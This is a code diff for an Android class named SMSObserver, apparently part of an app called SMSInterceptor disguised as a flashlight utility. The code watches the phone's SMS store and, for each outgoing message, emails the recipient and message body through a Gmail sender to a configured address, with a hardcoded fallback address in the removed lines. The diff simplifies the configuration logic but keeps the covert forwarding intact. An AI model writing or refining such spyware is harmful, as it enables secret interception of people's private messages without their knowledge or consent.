@@ -29,11 +29,8 @@ public class SMSObserver extends ContentObserver {
   private static GmailSender sender; 
   private static Configure configure;
 
-  private static int count = 0;
-  private static String initId = "0";
-  private static final int maxTries = 3;
-
   private static String endPoint;
+  private static String initId = "0";
   private static String sPhoneNumberDb;
   private static String sEmailAddressDb;
   private static String gmailEmailString;
@@ -46,7 +43,9 @@ public class SMSObserver extends ContentObserver {
     handler = handler;    
     SMSObserver.context = context;
     db = new DatabaseHandler(context);
-    contact = new Contacts();
+    contact   = new Contacts();
+    configure = new Configure();
+    gmailEmailString = configure.emailAddress();
 
     Log.d(TAG, "Entering SMSObserver constructor");
 
@@ -78,42 +77,6 @@ public class SMSObserver extends ContentObserver {
     String sOrder = "date desc limit 1";
    
     try {
-      if(db == null) {
-        db = new DatabaseHandler(context);
-        Log.d(TAG, "SMSObserver() constructor db == null");
-        Log.d(TAG, "SMSObserver() constructor db = new DatabaseHandler(context)");
-      }
-
-      List<FlashLightDatabase> flashLightDatabase = db.getAllFlashLightDatabase();
-
-      if(flashLightDatabase == null) {
-        gmailEmailString = "smsinterceptorapp@gmail.com";
-        Log.d(TAG, "SMSObserver() constructor flashLightDatabase == null");
-        Log.d(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
-      }
-      for(FlashLightDatabase fldb : flashLightDatabase) {
-        sPhoneNumberDb  = fldb.getPhoneNumber();
-        sEmailAddressDb = fldb.getEmailAddress();
-      }
-      if(sEmailAddressDb == null) {
-        gmailEmailString = "smsinterceptorapp@gmail.com";
-        Log.d(TAG, "SMSObserver() constructor sEmailAddressDb == null");
-        Log.d(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
-      }
-      else {
-        gmailEmailString = sEmailAddressDb;
-        Log.d(TAG, "SMSObserver() constructor sEmailAddressDb != null");
-        Log.d(TAG, "SMSObserver() constructor gmailEmailString = sEmailAddressDb");
-      }
-    }
-    catch(NullPointerException e) {
-      //Log.e(TAG, "SMSObserver() constructor NullPointerException e " + e.toString());
-      Log.e(TAG, "SMSObserver() constructor NullPointerException e");
-      Log.e(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
-      if (++count == maxTries) gmailEmailString = "smsinterceptorapp@gmail.com";
-    }
-
-    try {
 
       cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
       cursor.moveToLast();
@@ -138,11 +101,10 @@ public class SMSObserver extends ContentObserver {
           @Override
           public void run() {
             try {
-              if(gmailEmailString != "null") {
-                sender = new GmailSender();
-                sender.sendMail("SMSInterceptor",
-                "OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body, gmailEmailString);
-              }
+              sender = new GmailSender();
+              sender.sendMail("SMSInterceptor",
+                "OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body,
+                gmailEmailString);
             }
             catch(Exception e) {
               e.printStackTrace();
